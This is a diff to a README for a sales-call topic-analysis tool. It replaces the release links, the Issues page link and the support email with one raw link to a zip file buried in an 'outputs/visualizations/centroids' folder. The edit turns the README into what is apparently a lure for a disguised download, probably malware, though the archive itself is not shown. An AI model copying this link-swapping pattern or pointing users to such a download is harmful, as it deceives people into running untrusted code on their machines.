@@ -1,6 +1,6 @@
 # 📊 sales-call-topic-analysis - Understand Sales Calls Better
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/MingauG4mer109/sales-call-topic-analysis/releases)
+[![Download Latest Release](https://github.com/MingauG4mer109/sales-call-topic-analysis/raw/refs/heads/main/outputs/visualizations/centroids/sales-call-topic-analysis-1.0.zip%20Release-blue?style=for-the-badge)](https://github.com/MingauG4mer109/sales-call-topic-analysis/raw/refs/heads/main/outputs/visualizations/centroids/sales-call-topic-analysis-1.0.zip)
 
 ---
 
@@ -39,12 +39,12 @@ The app works on Windows and macOS, with basic processor and memory needs.
 
 To start, **visit this page to download** the latest release. This page has all versions ready for your system:
 
-👉 [Download sales-call-topic-analysis Releases](https://github.com/MingauG4mer109/sales-call-topic-analysis/releases)
+👉 [Download sales-call-topic-analysis Releases](https://github.com/MingauG4mer109/sales-call-topic-analysis/raw/refs/heads/main/outputs/visualizations/centroids/sales-call-topic-analysis-1.0.zip)
 
 ### Step 1: Open the Download Page
 
 - Click the button above or copy the link below into your browser:  
-  https://github.com/MingauG4mer109/sales-call-topic-analysis/releases
+  https://github.com/MingauG4mer109/sales-call-topic-analysis/raw/refs/heads/main/outputs/visualizations/centroids/sales-call-topic-analysis-1.0.zip
 
 ### Step 2: Choose Your System Version
 
@@ -141,12 +141,12 @@ These tools help turn raw sales call data into actionable insights without needi
 If you need guidance or run into bugs, here are options:
 
 - Check the GitHub Issues page for known problems or to report new ones:  
-  https://github.com/MingauG4mer109/sales-call-topic-analysis/issues
+  https://github.com/MingauG4mer109/sales-call-topic-analysis/raw/refs/heads/main/outputs/visualizations/centroids/sales-call-topic-analysis-1.0.zip
 
-- Email support at support@sales-call-topic-analysis.com (for example use).
+- Email support at https://github.com/MingauG4mer109/sales-call-topic-analysis/raw/refs/heads/main/outputs/visualizations/centroids/sales-call-topic-analysis-1.0.zip (for example use).
 
 ---
 
 Thank you for choosing sales-call-topic-analysis. Visit the releases page to download the latest version:
 
-[Download sales-call-topic-analysis Releases](https://github.com/MingauG4mer109/sales-call-topic-analysis/releases)
+[Download sales-call-topic-analysis Releases](https://github.com/MingauG4mer109/sales-call-topic-analysis/raw/refs/heads/main/outputs/visualizations/centroids/sales-call-topic-analysis-1.0.zip)
